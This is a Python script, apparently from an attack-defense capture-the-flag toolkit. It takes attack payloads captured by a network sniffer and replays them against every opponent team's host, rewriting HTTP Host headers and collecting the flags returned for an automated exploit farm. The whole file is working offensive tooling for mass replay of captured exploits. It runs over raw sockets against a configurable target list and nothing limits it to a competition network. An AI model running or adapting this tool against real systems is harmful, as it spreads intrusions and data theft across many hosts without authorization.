#!/usr/bin/env python3
"""
Replay a stolen attack (captured by steal/sniffer.py) against every opponent
team. Prints recovered flags to stdout -- so you can run it by hand OR drop a
one-line wrapper in exploits/ and let the farm run it every tick.

Usage:
    python steal/replay.py <capture.json>              # replay vs all teams
    python steal/replay.py <capture.json> --target IP  # replay vs one host
    python steal/replay.py --latest <svc>              # newest capture for a svc
    python steal/replay.py --list                      # list captures

Limitation: blind byte-replay works great for web / stateless bugs. Pwn attacks
that depend on a per-target leak need light templating, not raw replay -- copy
the payload into a pwn exploit instead.
"""
import sys
import os
import re
import json
import glob
import socket

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import config  # noqa: E402

FLAG_RE = re.compile(config.FLAG_REGEX)


def load(path):
    with open(path) as f:
        return json.load(f)


def latest_for(svc):
    d = os.path.join(config.CAPTURE_DIR, svc)
    files = sorted(glob.glob(os.path.join(d, "*.json")))
    return files[-1] if files else None


def list_captures():
    for d in sorted(glob.glob(os.path.join(config.CAPTURE_DIR, "*"))):
        caps = glob.glob(os.path.join(d, "*.json"))
        print(f"{os.path.basename(d):<12} {len(caps)} capture(s)")


def rewrite_http_host(payload, target):
    """For HTTP attacks, point the Host header at the new target IP."""
    try:
        text = payload.decode("latin1")
        if "\r\n" in text and text.split(" ", 1)[0] in (
            "GET", "POST", "PUT", "HEAD", "DELETE", "OPTIONS", "PATCH"
        ):
            text = re.sub(r"(?i)^Host:.*$", f"Host: {target}",
                          text, count=1, flags=re.MULTILINE)
            return text.encode("latin1")
    except Exception:
        pass
    return payload


def replay_one(rec, target):
    payload = bytes.fromhex(rec["payload_hex"])
    if rec.get("kind") == "http":
        payload = rewrite_http_host(payload, target)
    flags = []
    try:
        s = socket.create_connection((target, rec["port"]), timeout=6)
        s.settimeout(4)
        s.sendall(payload)
        data = b""
        try:
            while True:
                chunk = s.recv(8192)
                if not chunk:
                    break
                data += chunk
        except socket.timeout:
            pass
        s.close()
        flags = FLAG_RE.findall(data.decode("latin1"))
    except Exception as e:
        print(f"ERR {target}: {e}", file=sys.stderr)
    return flags


def main():
    if "--list" in sys.argv:
        list_captures()
        return
    if "--latest" in sys.argv:
        svc = sys.argv[sys.argv.index("--latest") + 1]
        path = latest_for(svc)
        if not path:
            sys.exit(f"no captures for {svc}")
    else:
        path = sys.argv[1]

    rec = load(path)

    if "--target" in sys.argv:
        targets = [sys.argv[sys.argv.index("--target") + 1]]
    else:
        targets = list(config.iter_targets())

    total = 0
    for t in targets:
        for fl in replay_one(rec, t):
            print(fl)          # farm contract: flags to stdout
            total += 1
    print(f"# replayed {os.path.basename(path)} vs {len(targets)} targets, "
          f"{total} flags", file=sys.stderr)


if __name__ == "__main__":
    main()
